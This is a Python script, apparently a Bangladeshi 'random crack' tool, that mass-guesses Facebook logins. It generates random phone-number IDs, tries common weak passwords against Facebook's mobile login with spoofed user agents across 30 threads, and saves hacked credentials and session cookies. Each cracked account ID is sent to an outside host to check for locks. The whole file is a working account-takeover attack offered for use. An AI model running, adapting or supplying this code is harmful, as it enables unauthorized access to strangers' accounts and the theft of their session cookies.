import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for tg in range(100):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.1.1','6.0.1','7.1.1','10','11','12','13','14','15'])
	c='SM-J320Y Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	xarif=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(xarif)
for ua in range(100):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(100):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
for xd in range(100):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12','13','14','15'])
	c='Mozilla/5.0 (Linux; Android 5.1.1; vivo Y21L Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,100)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	ua=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
	ugen.append(ua)	
	print(ugen)
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo =("""\033[1;32m 
\033[1;31m  __  __    _    ____  ___ _____ 
\033[1;32m  \ \/ /   / \  |  _ \|_ _|  ___|
\033[1;33m   \  /   / _ \ | |_) || || |_   
\033[1;34m   /  \  / ___ \|  _ < | ||  _|  
\033[1;35m  /_/\_\/_/   \_\_| \_\___|_|    
\033[1;32m┌━━━━━━━━━━━━━━━━━━\033[1;32m☠️━━━━━━━━━━━━━━━━━━━━┐
\033[1;31m│ [+] AUTHOR   : XA ƦIF                 |
\033[1;36m│ [+] GITHUB   : BD BADSHA              │
\033[1;37m│ [+] TOOLS    : \033[1;37mTrail\033[1;37m                  │
\033[1;35m│ [+] VERSION  :  \033[1;35m0.2  \033[1;35m                 │
\033[1;32m└━━━━━━━━━━━━━━━━━━\033[1;32m☠️━━━━━━━━━━━━━━━━━━━━┘""")
def naima():
	print('-------------------')

def Main():
        os.system("clear")
        print(logo)
        print(" [1] RANDOM CRACK")
        print(" [0] Exit")
        choice =input("\n [?] Choose : ")
        if choice in ["1","01"]:
            main()
        if choice in [" 0", "00"]:
            exit()
        else:
            exit()

def main():
    user=[]
    os.system('clear')
    print(logo)
    print('[×] Exm: 019, 016, 017, 018, 013, 014')
    code = input('[?] Choice Your Code : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('[×] Exm: 2000 3000 5000 10000 ')
    limit = int(input('[?] Choice Your Liimit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as TC:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('[×] SIM 2G,3G,4G,5G +WIFI')
        print('[×] Total ids: '+tl)
        print("[×] Your Code: "+code)
        print('[×] Airplne Moode On/Off')
        print('[×] Process has been started')
        print('-------------------')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh','I love you','123456','name+@@##','first+123','first+@@@']
            TC.submit(CIPHER,uid,pwx,tl)
    print('-------------------')
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as XARIF-OK.txt')
    print(' [✓] CP Id Save as XARIF-XD-CP.txt')
    print('-------------------')
def CIPHER(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[-FUCKING]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            #_____Mathoid______#
            header_freefb = {
  'authority': 'mbasic.facebook.com',
      'method': 'GET',
    'path': '/',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '1.5',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"V2111"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"12.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                cix = coki.split('c_user')[1]
                cid = cix[0:15]
                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
                if 'LOCK' in res:
                    return 'LOCK'
                else:
         
                    print(f'  \\33[1;92m  '+coki)
                print(f"\033[1;32m' [-FUCKED-OK💘] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/-FUCKED-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
         
            else:
                continue
        loop+=1
    except:
        pass
        
Main()